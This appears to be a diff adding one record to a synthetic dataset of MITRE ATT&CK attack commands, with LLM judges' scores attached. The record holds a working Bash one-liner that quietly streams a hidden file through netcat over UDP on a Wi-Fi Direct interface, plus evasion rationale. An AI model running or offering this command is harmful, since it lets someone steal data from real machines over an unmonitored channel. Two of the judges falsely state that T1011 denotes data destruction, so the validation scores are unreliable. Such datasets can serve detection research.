@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i p2p-wlp2s0-0 -nn udp port 55303 -U -w /dev/null >/dev/null 2>&1 & dd if=/var/tmp/.sdata bs=64k 2>/dev/null | nc -u -s 192.168.49.1 192.168.49.2 55303",
+  "explanation": "Streams a data file over Wi\u2011Fi Direct (p2p interface) using UDP on an uncommon port while silently monitoring that port. This is exfiltration over an alternate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Use the Wi\u2011Fi Direct interface to bypass the primary WLAN.",
+    "Send via UDP on port 55303 to avoid standard services.",
+    "Run tcpdump scoped to the p2p interface and port, discarding output.",
+    "Pipe dd output into nc, binding to the P2P source IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-370f7eb0",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags, and correct command separators for both the background tcpdump process and the data exfiltration via netcat.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does implement data exfiltration over an alternate channel (UDP over Wi-Fi Direct), it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1485 (Data Destruction) as claimed in the technique description.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:49:53.822580Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for `nohup`, `tcpdump`, `dd`, `nc`, piping, and redirection, with valid flags and arguments.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration, but the explanation incorrectly states it is 'in line with T1011,' which refers to Data Destruction, making the core mapping of the command's intent to the MITRE technique fundamentally misaligned.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:50:18.876663Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with correct backgrounding, piping, and redirections; tcpdump, dd, and nc flags/arguments are valid.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates file data over UDP from the specified Wi-Fi Direct IP and launches tcpdump silently, though capture may fail without root and the behavior aligns with exfiltration rather than data destruction.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:50:51.086484Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
